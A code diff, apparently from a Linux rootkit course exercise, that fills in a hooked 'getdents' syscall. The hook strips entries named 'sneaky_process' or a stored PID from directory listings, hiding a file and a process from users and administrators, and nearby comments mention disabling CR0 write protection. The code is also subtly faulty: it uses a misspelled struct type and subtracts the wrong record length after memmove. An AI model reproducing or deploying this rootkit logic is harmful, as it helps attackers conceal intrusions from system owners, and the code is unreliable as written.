@@ -17,7 +17,7 @@ struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
-  char d_name[BUFFLEN];
+  char d_name[];
 };
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -50,7 +50,20 @@ asmlinkage ssize_t (*original_sys_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-  //TODO
+  int nread = original_sys_getdents(fd, dirp, count);
+  int bpos;
+  for(bpos = 0; bpos < nread;){
+    struct linux_dirend *d = (void*)dirp + bpos;
+    if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, mypid) == 0){
+      void *next = (void*)d + d->d_reclen;
+      int to_move = (void*)dirp + nread - next;
+      memmove(d, next, to_move);
+      nread -= d->d_reclen;
+      continue;
+    }
+    bpos += d->d_reclen;
+  }
+  return nread;
 }
 /*
 //Define our new sneaky version of the 'open' syscall
